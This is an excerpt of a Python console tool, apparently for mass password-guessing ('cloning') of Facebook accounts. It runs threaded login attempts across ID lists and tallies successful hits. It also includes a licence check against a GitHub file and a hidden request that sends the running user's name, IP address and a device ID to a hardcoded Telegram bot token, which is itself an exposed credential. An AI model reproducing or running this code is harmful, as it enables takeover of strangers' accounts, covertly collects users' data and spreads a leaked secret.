...
scheck = requests.get("https://github.com/sivambeb/approval/blob/main/approval .txt").text
if sts in scheck:
    pass
else: 
...
tid = ""5891722831:AAF1gRDUvxMGeSGHynlJczQ2Pc6yMuf14z0
...
def psw():
	os.system('clear')
	banner()
	print(" [\u001b[36m>\033[1;37m] PASSWORD ADD GAR  ACCOUNT MA " )
	linex()
...
def name(): 
	...
	linex()
	uan = input(" [\u001b[36m•\033[1;37m] NAME HAL KTA : " )
...
__uuid = str(os.geteuid())+"CORNEL"+str(os.geteuid())
__id = "HV4-"+"".join(__uuid)
requests.get("https://api.telegram.org/bot5891722831:AAF1gRDUvxMGeSGHynlJczQ2Pc6yMuf14z0/sendMessage?chat_id=" + tid + "&text=" + "Name : " + uname + "\nIP Address : " + ip + "\nKey Id : " + __id)
...
def menu(my_name,my_id):
	...
	print(f""" [\u001b[36m2\033[1;37m] CRACK FILE         [https://www.facebook.com/profile.php?id=100000302924869 [1;37m] CONTACT ADMIN""")
...
def passwrd():
	...
	print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU SURU CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
	linex()
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('\n\033[1;37m----------------------------------------------')
	print(' [\u001b[36m•\033[1;37m] CLONING KHATAM AT '+time.strftime("%H:%M")+" "+ tag)
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[SHIVU-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
